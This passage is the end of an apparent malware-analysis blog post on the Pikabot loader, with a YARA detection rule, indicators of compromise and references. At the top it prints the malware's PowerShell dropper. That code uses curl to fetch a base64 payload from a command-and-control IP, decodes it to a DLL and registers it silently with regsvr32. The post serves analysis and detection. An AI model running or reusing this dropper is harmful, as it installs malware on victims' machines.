</span></span><span class="line"><span class="cl"><span class="nb">md </span><span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="p">(</span><span class="nb">Get-Command</span> <span class="n">curl</span><span class="p">.</span><span class="n">exe</span><span class="p">).</span><span class="n">Source</span> <span class="n">-NoNewWindow</span> <span class="n">-ArgumentList</span> <span class="s1">&#39;--url &lt;https://37.1.215.220/messages/DBcB6q9SM6&gt; -X POST --insecure --output &#39;</span><span class="p">,</span> <span class="nv">$nonresistantOutlivesDictatorial</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">Start-Sleep</span> <span class="n">-Seconds</span> <span class="n">40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ungiantDwarfest</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="n">dll</span> <span class="p">|</span> <span class="p">%{</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$_</span><span class="p">)};</span>
</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="n">dll</span> <span class="n">-Value</span> <span class="nv">$ungiantDwarfest</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">regsvr32</span> <span class="p">/</span><span class="n">s</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="n">dll</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="yara-rule">Yara Rule</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rule</span> <span class="n">pikabot</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">meta</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">malware</span> <span class="o">=</span> <span class="s2">&#34;Pikabot&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">hash</span> <span class="o">=</span> <span class="s2">&#34;11cbb0233aff83d54e0d9189d3a08d02a6bbb0ffa5c3b161df462780e0ee2d2d&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">reference</span> <span class="o">=</span> <span class="s2">&#34;https://d01a.github.io/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">author</span> <span class="o">=</span> <span class="s2">&#34;d01a&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">description</span> <span class="o">=</span> <span class="s2">&#34;detect pikabot loader and core module&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">strings</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">s1</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="mi">8</span><span class="n">A</span> <span class="mi">44</span> <span class="mi">0</span><span class="n">D</span> <span class="n">C0</span>
</span></span><span class="line"><span class="cl">      <span class="err">??</span> <span class="err">??</span> 
</span></span><span class="line"><span class="cl">      <span class="mi">88</span> <span class="mi">84</span> <span class="mi">0</span><span class="n">D</span> <span class="err">??</span> <span class="err">??</span> <span class="n">FF</span> <span class="n">FF</span> 
</span></span><span class="line"><span class="cl">      <span class="mi">4</span><span class="err">?</span>
</span></span><span class="line"><span class="cl">      <span class="mi">83</span> <span class="err">??</span> <span class="err">??</span>
</span></span><span class="line"><span class="cl">      <span class="mi">7</span><span class="n">C</span> <span class="err">??</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="n">C7</span> <span class="mi">45</span> <span class="o">|</span> <span class="mi">88</span> <span class="mi">95</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">condition</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">uint16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x5A4D</span>
</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="p">(</span><span class="n">uint32</span><span class="p">(</span><span class="n">uint32</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">))</span> <span class="o">==</span> <span class="mh">0x00004550</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">them</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="iocs">IoCs</h2>
<table>
<thead>
<tr>
<th>IoC</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>dff2122bb516f71675f766cc1dd87c07ce3c985f98607c25e53dcca87239c5f6</td>
<td>packed loader</td>
</tr>
<tr>
<td>2411b23bab7703e94897573f3758e1849fdc6f407ea1d1e5da20a4e07ecf3c09</td>
<td>unpacked loader</td>
</tr>
<tr>
<td>59f42ecde152f78731e54ea27e761bba748c9309a6ad1c2fd17f0e8b90f8aed1</td>
<td>unpacked loader</td>
</tr>
<tr>
<td>37.1.215[.]220</td>
<td>C2 Server IP</td>
</tr>
<tr>
<td>{99C10657-633C-4165-9D0A-082238CB9FE0}</td>
<td>mutex value</td>
</tr>
</tbody>
</table>
<h2 id="references">References</h2>
<ul>
<li><a href="https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html" target="_blank" rel="noopener noreffer ">https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html</a></li>
<li><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-pikabot" target="_blank" rel="noopener noreffer ">https://www.zscaler.com/blogs/security-research/technical-analysis-pikabot</a></li>
<li><a href="https://n1ght-w0lf.github.io/tutorials/qiling-for-malware-analysis-part-1/" target="_blank" rel="noopener noreffer ">https://n1ght-w0lf.github.io/tutorials/qiling-for-malware-analysis-part-1/</a></li>
<li><a href="https://github.com/qilingframework/qiling" target="_blank" rel="noopener noreffer ">https://github.com/qilingframework/qiling</a></li>
<li><a href="https://anti-debug.checkpoint.com/techniques/assembly.html" target="_blank" rel="noopener noreffer ">https://anti-debug.checkpoint.com/techniques/assembly.html</a></li>
<li><a href="https://unprotect.it/technique/int-0x2d/" target="_blank" rel="noopener noreffer ">https://unprotect.it/technique/int-0x2d/</a></li>
<li><a href="https://rayanfam.com/topics/defeating-malware-anti-vm-techniques-cpuid-based-instructions/" target="_blank" rel="noopener noreffer ">https://rayanfam.com/topics/defeating-malware-anti-vm-techniques-cpuid-based-instructions/</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-08-01&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/6c4e2676970a2f44ae50837246b8210a4429abe9" target="_blank" title="commit by mohamedadel46(muhammed195826@feng.bu.edu.eg) 6c4e2676970a2f44ae50837246b8210a4429abe9: update pikabot yara rule">
                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>6c4e267</a></span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/pikabot/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis" data-via="0xd01a" data-hashtags="Malware Analysis,Reverse Engineering"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://d01a.github.io/pikabot/" data-hashtag="Malware Analysis"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://d01a.github.io/pikabot/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://d01a.github.io/pikabot/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Trello" data-sharer="trello" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis" data-description="Pikabot loader and core deep analysis"><i class="fab fa-trello fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/malware-analysis/">Malware Analysis</a>,&nbsp;<a href="/tags/reverse-engineering/">Reverse Engineering</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/aurora-stealer-builder/" class="prev" rel="prev" title="Aurora Stealer Builder"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Aurora Stealer Builder</a>
            <a href="/syscalls/" class="next" rel="next" title="Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation">Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.102.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mohamed Adel</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
